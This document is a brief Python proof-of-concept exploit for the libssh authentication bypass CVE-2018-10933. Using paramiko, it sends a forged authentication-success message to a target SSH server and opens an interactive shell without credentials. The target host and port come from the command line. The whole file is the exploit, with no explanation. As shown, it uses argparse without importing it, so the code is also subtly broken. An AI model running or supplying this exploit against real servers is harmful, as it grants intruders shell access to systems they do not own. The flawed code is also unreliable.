#!/usr/bin/env python
# coding: utf-8

import paramiko
import socket
import sys

def poc(hostname="127.0.0.1", port=22):
  paramiko.util.log_to_file("poc.log")
  sock = socket.socket()
  sock.settimeout(1)
  try:
      sock.connect((hostname, port))

      # instantiate transport
      m = paramiko.message.Message()
      transport = paramiko.transport.Transport(sock)
      transport.start_client()

      m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
      transport._send_message(m)

      cmd_channel = transport.open_session()
      cmd_channel.invoke_shell()
      return 0

  except socket.error as e:
      print('[-] Connecting to host failed. Please check the specified host and port.')
      return 1

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description="libssh Authentication Bypass (CVE-2018-10933)")

  parser.add_argument('hostname', help='target', type=str)
  parser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)

  args = parser.parse_args()
  sys.exit(poc(**vars(args)))
